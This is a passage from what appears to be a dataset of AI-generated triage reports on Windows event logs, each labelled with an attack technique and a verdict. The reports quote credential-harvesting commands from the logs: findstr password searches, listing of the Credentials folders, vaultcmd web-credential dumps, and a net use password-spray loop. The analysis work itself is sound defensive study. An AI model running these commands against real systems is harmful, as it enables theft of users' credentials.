- The presence of temporary directory execution for Edge Update files, querying of unattend.xml files, and the repeated use of `wevtutil.exe` and `conhost.exe`, especially when coupled with high integrity level processes, point toward behavior that is not immediately clear without context.
- Given these elements, it’s challenging to conclusively label the activity as purely benign or outright malicious without additional context such as known updates, user behavior, and normal expected activities.

### Resolution:

**SUSPICIOUS**

### Recommendations:

1. **Further Investigation:**
   - Gather more context on administrative activities, user behavior, and update schedules for Microsoft Edge on `Server002`.
   - Examine if the same or similar activities have been logged in the past and correlate them with legitimate administrative actions.

2. **Monitor and Alert:**
   - Continue to monitor for any escalated or unexpected administrative actions, especially involving `cmd.exe`, `wevtutil.exe`, and temporary directories.
   - Set up alerts for abnormal uses of system utilities, particularly in combination with high-integrity process executions.

3. **Environmental Checks:**
   - Verify the integrity and expected configurations of `unattend.xml` against any unusual access patterns.
   - Ensure system time settings and changes are authorized and part of regular maintenance activities.

Implementing these actions will help confirm whether these activities indicate potential threats or if they are part of routine system management tasks within the organizational environment."
Extracting passwords with findstr,"### Detailed Analysis:

1. **System Logs:**
   - The System logs primarily indicate routine system activities like time updates (`EventID: 24`) and `svchost.exe` activities, which are typically non-suspicious on their own. These logs do not exhibit behavior that is directly indicative of malicious activity.

2. **Windows PowerShell Logs:**
   - PowerShell logs show execution with commands that search for files potentially containing sensitive information using the command:
     ```
     powershell.exe & {findstr /si pass *.xml *.doc *.txt *.xls; ls -R | select-string -ErrorAction SilentlyContinue -Pattern password}
     ```
   - This command seems designed to find files with passwords, which could indicate an attempt to extract sensitive information. The use of such a command is highly suspicious, especially on a high-profile system like the CEO's computer.

3. **Sysmon Logs:**
   - Sysmon logs show the execution of standard system utilities such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and PowerShell, often for legitimate administrative purposes. However, the `PowerShell` instance (linked to suspicious activity in the PowerShell logs) originated from the `wsmprovhost.exe`, commonly used for remote management tasks, which may indicate misuse.
   - The frequent launch of `Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe` with various arguments is typical for background update checks and does not necessarily indicate malicious behavior.

4. **Application Logs:**
   - The logs mainly consist of start and stop events for Edge Update, which again are normal activities related to software maintenance and updating.

5. **Security Logs:**
   - The Security logs show normal system activities with logon and privilege auditing events without any clear signs of abnormal elevation of privileges or failed authentications that stand out.

### Assessment:
- **Suspicious Activity:**
  The primary reason for concern is the PowerShell activity, which is explicitly searching for files with passwords. This suggests an attempt to gather sensitive information, typical of reconnaissance or an insider threat.

### Resolution:
- **SUSPICIOUS:**
  The logs contain activities that do not align with typical behavior expected from a CEO's machine, particularly the PowerShell command aimed at extracting sensitive data. Further investigation is essential to verify whether this command was executed by a legitimate administrative task or an unauthorized entity.

### Recommended Actions:
1. **Immediate Investigation:**
   - Review who executed the PowerShell command and why, including any remote management activities related to `wsmprovhost.exe`.
   - Analyze user activity logs to identify if an unauthorized user executed these commands.

2. **Security Hygiene:**
   - Ensure strong password policies.
   - Implement monitoring for commands that perform reconnaissance actions.
   
3. **Enhance Monitoring:**
   - Deploy more rigorous audit logging and monitoring for sensitive systems and files.
   - Set alerts for suspicious PowerShell activity to prevent and detect potential breaches swiftly.

4. **User Education:**
   - Conduct security awareness training focused on the risk of improper use of administrative tools and command-line utilities.

Further analysis and cross-referencing with other telemetry (such as network logs or third-party security reports) would be valuable to confirm or refute any malicious intent."
List Credential Files via PowerShell,"Upon reviewing the provided Windows event logs, several details stand out, particularly in the sections related to Security, Windows PowerShell, and Sysmon logs. Here's a breakdown of the observations:

### Suspicious and Anomalous Behavior

1. **Windows PowerShell Activities:**
   - There is a PowerShell script being executed with the following command: 
     ```powershell
     {$usernameinfo = (Get-ChildItem Env:USERNAME).Value; Get-ChildItem -Hidden C:\Users\$usernameinfo\AppData\Roaming\Microsoft\Credentials\; Get-ChildItem -Hidden C:\Users\$usernameinfo\AppData\Local\Microsoft\Credentials\}
     ```
   - This PowerShell command attempts to enumerate directories typically used to store sensitive information such as user credentials. The use of the `Get-ChildItem` command on paths related to credentials is suspicious and indicative of potential credential harvesting or reconnaissance activities.

2. **Process Execution Patterns:**
   - In the Sysmon logs, there are multiple executions of native Windows utilities such as `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, and `whoami.exe`. 
   - The usage of these utilities without further context could indicate normal administrative tasks; however, their use preceding or succeeding the suspicious PowerShell activity raises a flag. `whoami.exe` and `HOSTNAME.EXE` are often used for reconnaissance, which aligns with the behavior seen.

3. **Time Change Events:**
   - The Security and System logs record changes to the system time (`EventID 4616` from Security logs and `EventID 1` from Kernel-General), albeit these events do not appear inherently malicious. Changing system time can sometimes correlate with attempts to evade logging or synchronization issues within a compromised machine, though this is not clear-cut evidence on its own.

4. **Miscellaneous Observations:**
   - Various instances of `MicrosoftEdgeUpdate.exe` processes are logged, related to what appears to be legitimate Microsoft Edge Update activities, likely benign. However, in tandem with other observations, they need monitoring to ensure they are not leveraged for malicious updates or downloads.

### Assessment of Malicious Indicators

There is a clear indicator of potential malicious activity due to the suspicious PowerShell command aimed at extracting credential-related information. The execution of native Windows utilities could either be part of legitimate admin tasks or indicative of initial reconnaissance by a malicious actor. Given the context and the suspicious PowerShell execution, it is prudent to err on the side of caution.

### Conclusion

**Resolution: SUSPICIOUS**

The logs contain activities, particularly with the PowerShell execution, that are not typical for standard operations and suggest potential reconnaissance or malicious intent. Further investigation is warranted to confirm the intentions behind the PowerShell command and determine if there has been any compromise or data exfiltration.

### Guidance on How to Proceed

- **Immediate Action:**
  - Isolate the affected system to prevent potential lateral movement.
  - Collect additional evidence, including any running processes, open network connections, and recent file modifications.
  
- **Review Access Logs:**
  - Examine access logs to and from the affected machine for unusual patterns or connections to external IPs.

- **Credential Security:**
  - Ensure that credentials stored in the system are rotated and managed with robust security measures.
  
- **Mitigation:**
  - Implement stricter PowerShell execution policies and logging.
  - Facilitate user education on detecting phishing attempts if the attack vector involves user interaction.
  
- **Consult EDR:**
  - Utilize Endpoint Detection and Response (EDR) tools to assess the breadth of the issue and analyze potential indicators of compromise (IOCs) across the network.

Further analysis and potential response actions should be guided by continuous monitoring and additional context gathered from related systems and network logs."
Password Spray all Domain Users,"### Analysis of the Windows Event Logs:

#### Observations:

1. **Command and Scripting Activities:**
   - Multiple instances of `cmd.exe` are executed with slightly unusual command lines:
     - `""cmd.exe"" /c if not exist %%temp%%\\users.txt (exit /b 1)`
     - A batch file `parse_net_users.bat` located in a temporary directory is executed.
     - Use of the `net use` command in a looping fashion to attempt connections using a specific password `Spring2020`.

2. **Execution of Potential Network Reconnaissance/Enumeration Commands:**
   - `wevtutil.exe` and `whoami.exe` are executed, which could indicate system enumeration or event log query activities.

3. **Sysmon Logs:**
   - The High integrity level indicates elevated privileges for the account running these processes.
   - `wsmprovhost.exe` as a parent process, commonly associated with Windows Remote Management (WinRM) or PowerShell activity, is not uncommon, but given the user and context, this could indicate remote execution contexts if unexpected.

4. **Security Logs:**
   - Event ID 4672 signifies special privileges were assigned to the `admin_test` account.
   - Logon activity using NTLM authentication from a workstation named `DESKTOP-3HL5B2P`.

5. **System and Time Event Logs:**
   - Time discrepancies where the system time was adjusted could indicate attempt to manipulate time-based security controls/logging.

#### Suspicious Behavior:
- The use of `cmd.exe` running loops with network commands and writing to a network share directory suggests password spraying or credential validation attempts.
- The execution of `net use` commands targeting IPC$ can be related to lateral movement or exploitation attempts.
- Elevated privileges combined with NTLM logon attempts suggest privilege escalation risks or penetration testing activities.

#### Assessment and Threats:
- The observed activities suggest potentially malicious behavior focused on credential spraying against network resources, likely trying to enumerate or map network shares using default or previously used passwords.
- The batch script invocation and the network command attempts are consistent with tactics employed by an actor attempting lateral movement within an organization.

### Resolution: MALICIOUS

**Guidance on How to Proceed:**
1. **Immediate Action Required:**
   - Isolate the impacted system (Server002) to prevent potential additional spread or data exfiltration.
   - Reset all passwords for the `admin_test` account and other privileged accounts that might have been compromised.

2. **Forensic Investigation:**
   - Conduct a deeper forensic analysis on `Server002` to verify if any sensitive data has been accessed or if any additional backdoors have been installed.
   - Examine the `parse_net_users.bat` script and other executed files for additional context.

3. **Network Monitoring:**
   - Implement enhanced monitoring on the network for similar command signatures and any unusual data transfer patterns.
   - Track any communication from external IPs, especially those not usually interacting with critical systems.

4. **User Education and IT Policy Review:**
   - Enhance user awareness on phishing and password management.
   - Review and potentially restrict the use of high privilege operations and sensitive command executions based on roles.

5. **Long-term Cybersecurity Posture Improvement:**
   - Consider deploying more stringent least-privilege access models and multi-factor authentication mechanisms.
   - Evaluate and improve your EDR and SIEM solutions to detect anomalous behaviors at an early stage."
Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Web Credentials],"The Windows event logs provided for this investigation reveal several activities, some of which raise concerns about potential malicious activity on the CEO's machine.

### Analysis:

1. **PowerShell Command Execution**:
   - The logs show multiple PowerShell sessions starting with the command: `powershell.exe & {vaultcmd /listcreds:""Web Credentials"" /all}`.
   - The use of `VaultCmd.exe` to list saved web credentials is highly suspicious. This command can be used to enumerate stored credentials, possibly intending to access sensitive information.

2. **Process and Command Line Activity**:
   - **Sysmon Log Analysis**:
     - Multiple instances of processes such as `whoami.exe` and `conhost.exe` are executed, which themselves are not inherently malicious but could be used to query user account details.
     - `VaultCmd.exe` is executed with parameters that suggest an attempt to list stored credentials from the Windows vault, which is not a typical or benign activity for standard user operations.

3. **Edge Update Activity**:
   - Frequent update activities related to Microsoft Edge are visible, including execution of `MicrosoftEdgeUpdate.exe` from temporary directories. These could align with legitimate software updates or be abused for persistence or privilege escalation if performed in correlation with other suspicious activities.

4. **Windows Event Logs Time Reset**:
   - Logs indicate a time change event handled by `svchost.exe`, which is documented in both the Security and System logs. Time synchronization changes, if not explained by legitimate network or system management services, can be a tactic used to obfuscate log entries or align attack operations to evade detection.

### Conclusion and Recommendation:

- **Conclusion**:
  - The command usage of `VaultCmd.exe` to list stored web credentials is suspicious, indicating possible credential harvesting. Combined with the context of PowerShell usage and Edge update executions from temporary directories, this activity appears orchestrated rather than incidental. Despite some logs indicating legitimate software updates, the specific command-line activities around credentials suggest careful planning and execution often associated with breaches or exploitation.

- **Recommendation**:
  - Immediate further investigation is required. This should involve:
    - **Forensic Analysis** of the PowerShell command history and executed scripts.
    - **Network Traffic Assessment** to determine any suspicious outbound traffic or data exfiltration attempts.
    - **User and Account Activities** audit to ensure no unauthorized access.
    - **Credential Reset** for sensitive accounts potentially affected by this behavior.

- **Resolution**: SUSPICIOUS
  - The activities require deeper analysis to confirm whether they are part of a broader malicious campaign or an isolated incident. It’s important to ensure defenses are reinforced and further logs are collected to monitor ongoing activity."
ADFS token signing and encryption certificates theft - Remote,"Upon reviewing the provided event logs, there are several observations to note with the context of identifying potential malicious activity:

1. **Security Logs Analysis**:
    - The Event ID 4616, which refers to a time change event, shows that the system time on ""Server002"" was adjusted backward. This can sometimes be used by attackers attempting to bypass time-based security checks or to confuse log event timelines.

2. **Sysmon Logs Analysis**:
    - Multiple instances of `powershell.exe`, `wevtutil.exe`, and `conhost.exe` being launched by the user 'SERVER002\admin_test' indicate scripting or command-line activity. Of particular note is the PowerShell command involving potentially malicious intent:
      - The command-line seen includes importing modules such as `ActiveDirectory` and `AADInternals`, usage of `DCSync` technique to retrieve NTLM hash, and accessing Active Directory Federation Services (ADFS) configuration. 
      - The PowerShell script attempts to export ADFS certificates and retrieve sensitive information, which is highly unusual and suggests an attempt to compromise ADFS infrastructure.
    - The pattern of `wevtutil.exe` usage suggests attempts to interact with event logs, which might be indicative of attempts to clear or query event logs, common post-exploitation activities.

3. **Potential Malicious Indicators**:
    - A PowerShell script executing a series of commands that appear designed to access and export sensitive Active Directory data.
    - Use of DCSync-like activity to retrieve an NT hash, suggesting credential dumping attempts.
    - The presence of `ADFSConfig` retrieval and decryption of certificates could imply preparatory stages of an attack targeting federation services.
    
4. **Normal Activity**:
    - Many EdgeUpdate processes and typical services running as SYSTEM. These appear to be benign routine update activities.
    - Security log events that involve system services such as `svchost.exe` typically executing legitimate and standard Windows operations. 

5. **Resolution**:
   - **MALICIOUS**: The activity involving the PowerShell script is a clear indicator of compromised behavior aimed at increasing privileges and accessing sensitive information. The sophistication and intent behind the commands executed, particularly the usage of AADInternals and DCSync methods, provide a certainty of malicious intent.

**Guidance on How to Proceed**:
- Immediate containment protocols should be initiated on this system to prevent the spread or escalation of the attack.
- A deep dive forensic investigation should be conducted, focusing on compromised accounts, potential lateral movement, and unauthorized access to ADFS or sensitive data.
- Review and restrict the access privileges of 'SERVER002\admin_test' and other accounts that might be affected.
- Validate the integrity and authenticity of configuration items in the ADFS and Active Directory environment.
- Consider contacting a third-party security incident response team to assist with mitigation and ensure no hidden persistence mechanisms remain."
